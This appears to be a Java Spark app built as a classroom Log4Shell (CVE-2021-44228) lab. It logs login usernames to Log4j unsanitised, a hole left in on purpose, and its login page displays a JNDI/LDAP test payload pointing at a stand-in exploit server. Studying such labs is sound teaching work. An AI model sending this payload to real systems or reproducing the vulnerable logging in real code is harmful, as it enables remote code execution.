package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import static spark.Spark.*;

public class VulnerableApp {
    private static final Logger logger = LogManager.getLogger(VulnerableApp.class);

    public static void main(String[] args) {
        port(8080);

        get("/", (req, res) -> {
            return "<!DOCTYPE html>" +
                "<html lang='en'>" +
                "<head>" +
                "<meta charset='UTF-8'>" +
                "<meta name='viewport' content='width=device-width, initial-scale=1.0'>" +
                "<title>Log4Shell Demo</title>" +
                "<link href='https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;700&display=swap' rel='stylesheet'>" +
                "<style>" +
                "*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }" +
                "body {" +
                "  background-color: #0a0c0f;" +
                "  color: #c9d1d9;" +
                "  font-family: 'Syne', sans-serif;" +
                "  min-height: 100vh;" +
                "  display: flex;" +
                "  align-items: center;" +
                "  justify-content: center;" +
                "  background-image: radial-gradient(ellipse at 20% 50%, rgba(255,80,80,0.04) 0%, transparent 60%)," +
                "                    radial-gradient(ellipse at 80% 20%, rgba(255,80,80,0.03) 0%, transparent 50%);" +
                "}" +
                ".container {" +
                "  width: 100%;" +
                "  max-width: 420px;" +
                "  padding: 0 24px;" +
                "}" +
                ".badge {" +
                "  display: inline-block;" +
                "  font-family: 'Share Tech Mono', monospace;" +
                "  font-size: 11px;" +
                "  letter-spacing: 0.12em;" +
                "  color: #ff5050;" +
                "  border: 1px solid rgba(255,80,80,0.3);" +
                "  padding: 4px 10px;" +
                "  margin-bottom: 24px;" +
                "  text-transform: uppercase;" +
                "}" +
                "h1 {" +
                "  font-size: 28px;" +
                "  font-weight: 700;" +
                "  color: #f0f0f0;" +
                "  margin-bottom: 6px;" +
                "  letter-spacing: -0.02em;" +
                "}" +
                ".subtitle {" +
                "  font-family: 'Share Tech Mono', monospace;" +
                "  font-size: 12px;" +
                "  color: #555f6b;" +
                "  margin-bottom: 36px;" +
                "}" +
                "form {" +
                "  display: flex;" +
                "  flex-direction: column;" +
                "  gap: 14px;" +
                "  margin-bottom: 32px;" +
                "}" +
                "input {" +
                "  background: #111417;" +
                "  border: 1px solid #1e2530;" +
                "  color: #c9d1d9;" +
                "  font-family: 'Share Tech Mono', monospace;" +
                "  font-size: 14px;" +
                "  padding: 12px 16px;" +
                "  outline: none;" +
                "  transition: border-color 0.2s;" +
                "  width: 100%;" +
                "}" +
                "input::placeholder { color: #3a4450; }" +
                "input:focus { border-color: rgba(255,80,80,0.5); }" +
                "button {" +
                "  background: #ff5050;" +
                "  color: #0a0c0f;" +
                "  border: none;" +
                "  font-family: 'Syne', sans-serif;" +
                "  font-weight: 700;" +
                "  font-size: 13px;" +
                "  letter-spacing: 0.08em;" +
                "  text-transform: uppercase;" +
                "  padding: 13px;" +
                "  cursor: pointer;" +
                "  transition: background 0.2s;" +
                "  margin-top: 4px;" +
                "}" +
                "button:hover { background: #ff3333; }" +
                ".payload-block {" +
                "  border-top: 1px solid #1e2530;" +
                "  padding-top: 24px;" +
                "}" +
                ".payload-label {" +
                "  font-size: 11px;" +
                "  letter-spacing: 0.1em;" +
                "  text-transform: uppercase;" +
                "  color: #555f6b;" +
                "  margin-bottom: 10px;" +
                "}" +
                "code {" +
                "  display: block;" +
                "  font-family: 'Share Tech Mono', monospace;" +
                "  font-size: 12px;" +
                "  color: #ff5050;" +
                "  background: #0f1215;" +
                "  border: 1px solid #1e2530;" +
                "  padding: 12px 14px;" +
                "  word-break: break-all;" +
                "  line-height: 1.6;" +
                "}" +
                "</style>" +
                "</head>" +
                "<body>" +
                "<div class='container'>" +
                "  <div class='badge'>CVE-2021-44228 &mdash; Log4Shell Demo</div>" +
                "  <h1>Authentication</h1>" +
                "  <p class='subtitle'>Systems &amp; Software Security &mdash; Lab Environment</p>" +
                "  <form method='POST' action='/login'>" +
                "    <input name='username' placeholder='Username' autocomplete='off'>" +
                "    <input name='password' type='password' placeholder='Password'>" +
                "    <button type='submit'>Sign In</button>" +
                "  </form>" +
                "  <div class='payload-block'>" +
                "    <p class='payload-label'>Test Payload</p>" +
                "    <code>${jndi:ldap://ldap-server-exploit:1389/Exploit}</code>" +
                "  </div>" +
                "</div>" +
                "</body>" +
                "</html>";
        });

        post("/login", (req, res) -> {
            String user = req.queryParams("username");

            // VULNERABLE: Direct string concatenation
            logger.info("Login attempt for user: " + user);

            return "Logged attempt for: " + user;
        });

        logger.info("Server started on 8080");
    }
}